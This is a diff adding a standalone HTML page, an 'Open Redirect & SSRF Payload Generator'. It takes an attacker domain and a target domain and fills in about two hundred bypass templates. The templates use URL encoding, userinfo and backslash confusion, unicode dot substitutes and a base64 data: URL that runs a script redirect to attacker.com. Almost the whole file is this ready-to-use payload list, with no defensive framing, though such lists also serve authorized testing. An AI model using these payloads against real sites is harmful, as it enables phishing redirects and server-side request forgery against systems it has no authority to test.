@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect & SSRF Payload Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: #212121;
+            color: #f0f0f0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        label, input, button {
+            font-size: 1em;
+            margin: 5px 0;
+        }
+        input {
+            padding: 5px;
+            width: 300px;
+        }
+        button {
+            background-color: #b50bdb;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+        button:hover {
+            background-color: #b94bd1;
+        }
+        textarea {
+            width: 100%;
+            height: 400px;
+            margin-top: 20px;
+            background-color: #333;
+            color: #f0f0f0;
+            padding: 10px;
+            border: 1px solid #555;
+            resize: vertical;
+            white-space: pre;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <h1>Open Redirect & SSRF Payload Generator</h1>
+
+    <label for="domainInput">Attacker Domain:</label>
+    <input type="text" id="domainInput" placeholder="attacker.com">
+    <br>
+    <label for="targetInput">Target Domain:</label>
+    <input type="text" id="targetInput" placeholder="target.com">
+    <br>
+    <button id="generateButton">Generate Payloads</button>
+    <button id="copyButton">Copy All</button>
+
+    <textarea id="payloadOutput" readonly placeholder="Generated payloads will appear here..."></textarea>
+
+    <script>
+        const payloadTemplates = [
+`http://attacker.com`,
+`https://attacker.com`,
+`attacker.com`,
+`.attacker.com`,
+`//attacker.com`,
+`///attacker.com/%2F`,
+`////attacker.com/%2F`,
+`https://attacker.com/target.com`,
+`https://target.com.attacker.com/target.com`,
+`https://target.com@attacker.com/target.com`,
+`https:attacker.com`,
+`https;attacker.com`,
+`https:/\/\attacker.com`,
+`https:\attacker.com`,
+`https://target.com\@attacker.com`,
+`data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9hdHRhY2tlci5jb20iPC9zY3JpcHQ+`,
+`https://target.com%2f@attacker.com`,
+`https://target.com%252f@attacker.com`,
+`https://target.com%25252f@attacker.com`,
+`https://target.com%252f@attacker.com`,
+`https://attacker.com%fftarget.com`,
+`https://attacker.com?.target.com`,
+`https://attacker%e3%80%82com`,
+`https://attacker。com`,
+`https://attacker%02com`,
+`%2f%2fattacker%25e3%2580%2582com`,
+`//.@.@attacker.com`,
+`//target.com@attacker.com/%2f..`,
+`///attacker.com/%2f..`,
+`///target.com@attacker.com/%2f..`,
+`////attacker.com/%2f..`,
+`////target.com@attacker.com/%2f..`,
+`https://attacker.com/%2f..`,
+`https://target.com@attacker.com/%2f..`,
+`/https://attacker.com/%2f..`,
+`/https://target.com@attacker.com/%2f..`,
+`//attacker.com/%2f%2e%2e`,
+`//target.com@attacker.com/%2f%2e%2e`,
+`///attacker.com/%2f%2e%2e`,
+`///target.com@attacker.com/%2f%2e%2e`,
+`////attacker.com/%2f%2e%2e`,
+`////target.com@attacker.com/%2f%2e%2e`,
+`https://attacker.com/%2f%2e%2e`,
+`https://target.com@attacker.com/%2f%2e%2e`,
+`/https://attacker.com/%2f%2e%2e`,
+`/https://target.com@attacker.com/%2f%2e%2e`,
+`//attacker.com/`,
+`//target.com@attacker.com/`,
+`///attacker.com/`,
+`///target.com@attacker.com/`,
+`////attacker.com/`,
+`////target.com@attacker.com/`,
+`https://attacker.com/`,
+`https://target.com@attacker.com/`,
+`/https://attacker.com/`,
+`/https://target.com@attacker.com/`,
+`//attacker.com//`,
+`//target.com@attacker.com//`,
+`///attacker.com//`,
+`///target.com@attacker.com//`,
+`////attacker.com//`,
+`////target.com@attacker.com//`,
+`https://attacker.com//`,
+`https://target.com@attacker.com//`,
+`//https://attacker.com//`,
+`//https://target.com@attacker.com//`,
+`//attacker.com/%2e%2e%2f`,
+`//target.com@attacker.com/%2e%2e%2f`,
+`///attacker.com/%2e%2e%2f`,
+`///target.com@attacker.com/%2e%2e%2f`,
+`////attacker.com/%2e%2e%2f`,
+`////target.com@attacker.com/%2e%2e%2f`,
+`https://attacker.com/%2e%2e%2f`,
+`https://target.com@attacker.com/%2e%2e%2f`,
+`//https://attacker.com/%2e%2e%2f`,
+`//https://target.com@attacker.com/%2e%2e%2f`,
+`///attacker.com/%2e%2e`,
+`///target.com@attacker.com/%2e%2e`,
+`////attacker.com/%2e%2e`,
+`////target.com@attacker.com/%2e%2e`,
+`https:///attacker.com/%2e%2e`,
+`https:///target.com@attacker.com/%2e%2e`,
+`//https:///attacker.com/%2e%2e`,
+`//target.com@https:///attacker.com/%2e%2e`,
+`/https://attacker.com/%2e%2e`,
+`/https://target.com@attacker.com/%2e%2e`,
+`///attacker.com/%2f%2e%2e`,
+`///target.com@attacker.com/%2f%2e%2e`,
+`////attacker.com/%2f%2e%2e`,
+`////target.com@attacker.com/%2f%2e%2e`,
+`https:///attacker.com/%2f%2e%2e`,
+`https:///target.com@attacker.com/%2f%2e%2e`,
+`/https://attacker.com/%2f%2e%2e`,
+`/https://target.com@attacker.com/%2f%2e%2e`,
+`/https:///attacker.com/%2f%2e%2e`,
+`/https:///target.com@attacker.com/%2f%2e%2e`,
+`/%09/attacker.com`,
+`/%09/target.com@attacker.com`,
+`//%09/attacker.com`,
+`//%09/target.com@attacker.com`,
+`///%09/attacker.com`,
+`///%09/target.com@attacker.com`,
+`////%09/attacker.com`,
+`////%09/target.com@attacker.com`,
+`https://%09/attacker.com`,
+`https://%09/target.com@attacker.com`,
+`/%5cattacker.com`,
+`/%5ctarget.com@attacker.com`,
+`//%5cattacker.com`,
+`//%5ctarget.com@attacker.com`,
+`///%5cattacker.com`,
+`///%5ctarget.com@attacker.com`,
+`////%5cattacker.com`,
+`////%5ctarget.com@attacker.com`,
+`https://%5cattacker.com`,
+`https://%5ctarget.com@attacker.com`,
+`/https://%5cattacker.com`,
+`/https://%5ctarget.com@attacker.com`,
+`https://target.com@attacker.com`,
+`//attacker%E3%80%82com`,
+`\/\/attacker.com/`,
+`\/attacker.com/`,
+`//attacker%00.com`,
+`https://target.com/https://attacker.com/`,
+`〱attacker.com`,
+`〵attacker.com`,
+`ゝattacker.com`,
+`ーattacker.com`,
+`ｰattacker.com`,
+`/〱attacker.com`,
+`/〵attacker.com`,
+`/ゝattacker.com`,
+`/ーattacker.com`,
+`/ｰattacker.com`,
+`<>//attacker.com`,
+`//attacker.com\@target.com`,
+`https://:@attacker.com\@target.com`,
+`http://attacker.com:80#@target.com/`,
+`http://attacker.com:80?@target.com/`,
+`http://target.com+&@attacker.com#+@target.com/`,
+`http://attacker.com%0Dtarget.com/`,
+`//attacker.com:80#@target.com/`,
+`//attacker.com:80?@target.com/`,
+`//target.com+&@attacker.com#+@target.com/`,
+`//attacker.com%0Dtarget.com/`,
+`//;@attacker.com`,
+`http://;@attacker.com`,
+`http://attacker.com%2f%2f.target.com/`,
+`http://attacker.com%5c%5c.target.com/`,
+`http://attacker.com%3F.target.com/`,
+`http://attacker.com%23.target.com/`,
+`http://target.com:80%40attacker.com/`,
+`http://target.com%2eattacker.com/`,
+`/https:/%5cattacker.com/`,
+`/http://attacker.com`,
+`/%2f%2fattacker.com`,
+`/attacker.com/%2f%2e%2e`,
+`/http:/attacker.com`,
+`/http:attacker.com`,
+`/.attacker.com`,
+`///\;@attacker.com`,
+`/////attacker.com/`,
+`/////attacker.com`
+        ];
+
+        document.getElementById("generateButton").addEventListener("click", () => {
+            const attacker = document.getElementById("domainInput").value.trim();
+            const target = document.getElementById("targetInput").value.trim();
+            if (!attacker || !target) return alert("Both attacker and target domains are required.");
+
+            const output = payloadTemplates.map(p =>
+                p.replace(/attacker\.com/g, attacker).replace(/target\.com/g, target)
+            ).join("\n");
+
+            document.getElementById("payloadOutput").value = output;
+        });
+
+        document.getElementById("copyButton").addEventListener("click", () => {
+            const outputField = document.getElementById("payloadOutput");
+            outputField.select();
+            document.execCommand("copy");
+            alert("Payloads copied to clipboard!");
+        });
+    </script>
+</body>
+</html>
